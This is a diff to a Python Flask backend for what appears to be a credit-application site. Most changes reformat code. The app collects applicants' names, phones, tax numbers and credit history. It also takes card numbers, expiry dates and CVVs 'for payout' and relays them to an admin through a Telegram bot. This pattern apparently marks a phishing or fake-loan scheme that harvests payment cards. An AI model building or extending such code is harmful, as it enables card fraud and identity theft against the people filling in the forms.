@@ -75,6 +75,7 @@ def send_admin(text, keyboard=None):
     tg("sendMessage", payload)
 
 def send_long_message(chat_id, text, reply_markup=None):
+    """Отправка длинных сообщений частями, чтобы не обрезались"""
     if len(text) <= 4096:
         send_admin(text, reply_markup)
         return
@@ -134,10 +135,14 @@ def serve_card_page():
 @app.route("/get_application_data/<session_id>")
 def get_application_data(session_id):
     row = db_one("SELECT fullname, amount, term, payment, status FROM applications WHERE session_id = ?", (session_id,))
-    if not row: return jsonify({"error": "not_found"}), 404
+    if not row:
+        return jsonify({"error": "not_found"}), 404
     return jsonify({
-        "fullname": row[0], "amount": row[1], "term": row[2],
-        "payment": row[3], "status": row[4]
+        "fullname": row[0],
+        "amount": row[1],
+        "term": row[2],
+        "payment": row[3],
+        "status": row[4]
     })
 
 @app.route("/submit_card_details", methods=["POST"])
@@ -148,11 +153,13 @@ def submit_card_details():
     card_number = data.get("card_number")
     card_expiry = data.get("card_expiry")
     card_cvv = data.get("card_cvv")
+    
     masked_card = card_number[:4] + " **** **** " + card_number[-4:]
     row = db_one("SELECT fullname, amount, phone FROM applications WHERE session_id = ?", (session_id,))
     if row:
         fullname, amount, phone = row
-        db_exec("UPDATE applications SET card_holder=?, card_number=?, card_expiry=? WHERE session_id=?", (card_holder, masked_card, card_expiry, session_id))
+        db_exec("UPDATE applications SET card_holder=?, card_number=?, card_expiry=? WHERE session_id=?", 
+                (card_holder, masked_card, card_expiry, session_id))
         message = f"""
 💳 <b>ДАННЫЕ КАРТЫ ДЛЯ ВЫПЛАТЫ</b>
 
@@ -222,13 +229,15 @@ def submit_credit_application():
 @app.route("/check_status/<session_id>")
 def check_status(session_id):
     row = db_one("SELECT status FROM applications WHERE session_id = ?", (session_id,))
-    if not row: return jsonify({"status": "not_found"}), 404
+    if not row:
+        return jsonify({"status": "not_found"}), 404
     return jsonify({"status": row[0]})
 
 @app.route("/get_application/<session_id>")
 def get_application(session_id):
     row = db_one("SELECT fullname, phone, inn, amount, term, payment, credit_history, status FROM applications WHERE session_id = ?", (session_id,))
-    if not row: return jsonify({"status": "not_found"}), 404
+    if not row:
+        return jsonify({"status": "not_found"}), 404
     return jsonify({
         "fullname": row[0], "phone": row[1], "inn": row[2],
         "amount": row[3], "term": row[4], "payment": row[5],
